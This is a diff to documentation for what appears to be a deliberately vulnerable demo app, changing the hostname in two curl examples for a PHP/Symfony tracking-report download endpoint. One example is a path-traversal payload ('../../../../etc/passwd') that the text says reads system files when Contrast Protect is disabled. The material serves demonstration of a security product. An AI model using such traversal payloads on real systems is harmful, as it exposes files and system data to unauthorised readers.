@@ -574,14 +574,14 @@ The PHP/Symfony `trackingreportservice` exposes a download endpoint that concate
 
 **Legitimate request:**
 ```bash
-curl 'http://app.localhost/api/tracking-report/download?file=TRACK-A1B2C3D4.txt'
+curl 'http://cargocats.localhost/api/tracking-report/download?file=TRACK-A1B2C3D4.txt'
 ```
 
 Returns the seeded plain-text report for that shipment.
 
 **Exploit payload:**
 ```bash
-curl 'http://app.localhost/api/tracking-report/download?file=../../../../etc/passwd'
+curl 'http://cargocats.localhost/api/tracking-report/download?file=../../../../etc/passwd'
 ```
 
 With Contrast Protect **disabled**, returns the contents of `/etc/passwd`.
